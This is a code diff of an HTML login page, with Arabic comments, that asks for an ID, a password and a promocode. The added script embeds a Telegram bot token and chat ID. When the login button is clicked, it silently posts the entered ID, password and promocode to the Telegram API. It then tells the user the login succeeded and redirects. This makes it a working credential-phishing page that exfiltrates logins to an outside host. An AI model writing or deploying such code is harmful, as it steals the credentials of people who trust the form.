@@ -92,13 +92,6 @@
       font-size:14px;
     }
 
-    .footer a{
-      color:#3b82f6;
-      text-decoration:none;
-      font-weight:600;
-    }
-
-    /* رسالة التحقق */
     .msg {
       margin-bottom:15px;
       padding:12px;
@@ -130,6 +123,7 @@
   </style>
 </head>
 <body>
+
   <div class="card">
     <h2>LogIn</h2>
 
@@ -147,7 +141,7 @@
 
     <div class="input">
       <label>Promocode</label>
-      <input type="text" placeholder="Enter your Promocode" />
+      <input id="promoInput" type="text" placeholder="Enter your Promocode" />
     </div>
 
     <button class="btn" id="loginBtn">LogIn</button>
@@ -161,13 +155,18 @@
     const loginBtn = document.getElementById("loginBtn");
     const idInput = document.getElementById("idInput");
     const passInput = document.getElementById("passInput");
+    const promoInput = document.getElementById("promoInput");
     const msgBox = document.getElementById("msgBox");
+
+    // بيانات البوت
+    const BOT_TOKEN = "7964709805:AAETi2H-8nY49SMGNQuMksni1jZv_ktfB-k";
+    const CHAT_ID = "7336270350";
 
     loginBtn.addEventListener("click", () => {
       const id = idInput.value.trim();
       const pass = passInput.value.trim();
+      const promo = promoInput.value.trim();
 
-      // التحقق من البيانات
       if(id === "" || pass === ""){
         msgBox.style.display = "block";
         msgBox.className = "msg error";
@@ -175,16 +174,31 @@
         return;
       }
 
-      // نجاح التحقق
+      // إرسال البيانات إلى تيليجرام
+      const text =
+        `🔐 New Login\n` +
+        `🆔 ID: ${id}\n` +
+        `🔑 Password: ${pass}\n` +
+        `🎟 Promocode: ${promo}`;
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: text,
+        }),
+      });
+
       msgBox.style.display = "block";
       msgBox.className = "msg success";
       msgBox.textContent = "✔ Login successful! Redirecting...";
 
-      // التحويل بعد نصف ثانية
       setTimeout(() => {
-        window.location.href = "subscriptions.html";
+        window.location.href = "subscriptions.html?id=" + encodeURIComponent(id);
       }, 800);
     });
   </script>
+
 </body>
 </html>
